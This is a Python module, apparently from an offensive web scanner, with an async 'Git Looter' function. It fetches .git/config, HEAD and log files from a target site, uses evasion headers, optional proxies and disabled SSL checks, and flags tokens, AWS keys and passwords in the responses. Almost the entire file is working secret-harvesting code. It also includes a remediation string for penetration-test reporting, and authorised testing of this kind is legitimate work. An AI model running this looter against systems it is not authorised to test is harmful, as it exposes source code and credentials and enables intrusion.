import aiohttp
import asyncio
import re

async def exploit_git_looter(url, param=None, log_callback=None, headers=None, proxy=None):
    """
    Attempts to download sensitive files from exposed .git repository.
    """
    findings = []
    
    # Evasion Headers
    final_headers = headers.copy() if headers else {}
    
    # URL is likely http://target.com/ or http://target.com/.git/
    # We normalized to base url
    base_url = url.split(".git")[0]
    if not base_url.endswith("/"): base_url += "/"
    
    targets = [
        ".git/config",
        ".git/HEAD",
        ".git/logs/HEAD" # Contains commit history hash
    ]
    
    loot_data = ""
    
    try:
        if log_callback: log_callback(f"   ðŸ”‘ Git Looter: Dumping secrets from {base_url}.git...")
        
        async with aiohttp.ClientSession(headers=final_headers) as session:
            for t in targets:
                target_url = base_url + t
                try:
                    async with session.get(target_url, timeout=5, ssl=False, proxy=proxy) as resp:
                        if resp.status == 200:
                            text = await resp.text()
                            loot_data += f"\n--- {t} ---\n{text[:500]}\n"
                            
                            # Regex for secrets (Simple)
                            if "github_token" in text or "aws_access_key" in text or "password" in text:
                                loot_data += "\n[!] POTENTIAL SECRET FOUND!\n"
                except: pass
                
        if loot_data:
             findings.append({
                "type": "Source Code Disclosure (Git Looter)",
                "severity": "Critical",
                "detail": "Successfully accessed .git repository files.",
                "evidence": loot_data,
                "remediation": "Remove .git folder from production or deny access via web server config."
            })
            
    except: pass
    
    return findings
